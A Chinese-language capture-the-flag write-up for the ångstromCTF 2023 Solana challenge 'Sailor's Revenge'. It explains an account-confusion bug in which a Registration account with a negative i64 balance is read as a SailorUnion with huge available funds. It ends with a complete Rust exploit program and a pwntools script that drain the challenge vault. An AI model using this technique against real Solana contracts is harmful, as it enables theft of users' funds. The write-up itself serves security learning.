---
title: Blockchain - Sailor's Revenge
description: 2023 | ångstromCTF | pwn
tags:
    - solana
    - account confusions
---

## 题目

After the sailors were betrayed by their trusty anchor, they rewrote their union smart contract to be anchor-free! They even added a new registration feature so you can show off your union registration on the blockchain!

> nc challs.actf.co 31404

[:material-download: `sailors_revenge.tar.gz`](static/sailors_revenge.tar.gz)

## 解题思路

- 目标是获取至少 $10^8$ lamports

    ```rs
    const TARGET_AMT: u64 = 100_000_000;

    // check solve
    let balance = challenge
        .env
        .get_account(user.pubkey())
        .ok_or("could not find user")?
        .lamports;
    writeln!(socket, "lamports: {:?}", balance)?;

    if balance > TARGET_AMT {
        let flag = fs::read_to_string("flag.txt")?;
        writeln!(
            socket,
            "You successfully exploited the working class and stole their union dues! Congratulations!\nFlag: {}",
            flag.trim()
        )?;
    } else {
        writeln!(socket, "That's not enough to get the flag!")?;
    }
    ```

- 程序支持四种指令
    - **CreateUnion** 向 `vault` 发送 `bal` lamports，并创建一个账户存储 `SailorUnion` 结构的数据，初始 `available_funds` 为 0
    - **PayDues** 当 `member` 的余额不低于 `amt` 时，将 `amt` lamports 从 `member` 转移到 `vault`，`SailorUnion` 的 `available_funds` 增加 `amt`
    - **StrikePay** 当 `available_funds` 不低于 `amt` 时，将 `amt` lamports 从 `vault` 转移到 `member`（增加 `user` 账户余额的唯一方法 :D）
    - **RegisterMember** 创建一个账户存储 `Registration` 结构的数据，初始 `balance` 为 -100

    ```rs
    let ins = SailorInstruction::try_from_slice(instruction_data)?;
    match ins {
        SailorInstruction::CreateUnion(bal) => processor::create_union(program_id, accounts, bal),
        SailorInstruction::PayDues(amt) => processor::pay_dues(program_id, accounts, amt),
        SailorInstruction::StrikePay(amt) => processor::strike_pay(program_id, accounts, amt),
        SailorInstruction::RegisterMember(member) => processor::register_member(program_id, accounts, member)
    }
    ```

- `SailorUnion` 和 `Registration` 的字段是重合的，且 `balance` 的类型为 `i64`，若按照 `SailorUnion` 反序列化 `balance` 为负数的 `Registration` 类型的数据，将得到一个数值很大的 `u64`，同时 `member` 对应 `authority`

    ```rs
    #[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)]
    pub struct SailorUnion {
        available_funds: u64,
        authority: [u8; 32],
    }

    #[derive(Debug, Clone, BorshSerialize, BorshDeserialize, PartialEq, Eq, PartialOrd, Ord)]
    pub struct Registration {
        balance: i64,
        member: [u8; 32],
    }
    ```

- 那么，在调用 `strike_pay` 时将 `rich_boi` 为 `user` 注册的 `Registration` 账户作为 `SailorUnion` 账户传入就可以啦 (ΦˋωˊΦ)

### Exploitation

```bash
$ cargo new solve
$ cd solve/
$ mv src/main.rs src/lib.rs
$ cargo add solana_program borsh
$ cargo-build-bpf
```

??? note "Cargo.toml"

    ```toml
    [package]
    name = "solve"
    version = "0.1.0"
    edition = "2023"

    [dependencies]
    borsh = "0.10.3"
    solana-program = "1.14.11"

    [lib]
    crate-type = ["cdylib", "rlib"]
    ```

```rs
use borsh::{ BorshSerialize };
use solana_program::{
    account_info::{ next_account_info, AccountInfo },
    instruction::{ AccountMeta, Instruction },
    entrypoint::ProgramResult,
    entrypoint,
    program::invoke,
    pubkey::Pubkey,
    system_program,
};

#[derive(BorshSerialize)]
pub enum SailorInstruction {
    CreateUnion(u64),
    PayDues(u64),
    StrikePay(u64),
    RegisterMember([u8; 32]),
}

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let iter = &mut accounts.iter();
    let chall_id = next_account_info(iter)?;
    let registration = next_account_info(iter)?;
    let user = next_account_info(iter)?;
    let vault = next_account_info(iter)?;

    invoke(
        &Instruction {
            program_id: *chall_id.key,
            data: SailorInstruction::StrikePay(100_000_000).try_to_vec().unwrap(),
            accounts: vec![
                AccountMeta::new(*registration.key, false),
                AccountMeta::new(*user.key, false),
                AccountMeta::new(*user.key, true),
                AccountMeta::new(*vault.key, false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        },
        &[
            registration.clone(),
            user.clone(),
            vault.clone(),
        ]
    )?;

    Ok(())
}
```

```py
from pwn import *

account_metas = [
    ("program", "-r"), # readonly
    ("registration", "-w"),
    ("user", "sw"), # signer + writable
    ("vault", "-w"),
    ("system program", "-r"),
]
instruction_data = b""

p = remote("challs.actf.co", 31404)

with open("solve/target/deploy/solve.so", "rb") as f:
    solve = f.read()

p.sendlineafter(b"program len: \n", str(len(solve)).encode())
p.send(solve)

accounts = {}
for l in p.recvuntil(b"num accounts: \n", drop=True).strip().split(b"\n"):
    [name, pubkey] = l.decode().split(": ")
    accounts[name] = pubkey

p.sendline(str(len(account_metas)).encode())
for (name, perms) in account_metas:
    p.sendline(f"{perms} {accounts[name]}".encode())
p.sendlineafter(b"ix len: \n", str(len(instruction_data)).encode())
p.send(instruction_data)

p.interactive()
```

### Flag

> actf{maybe_anchor_can_kind_of_protect_me_from_my_own_stupidity}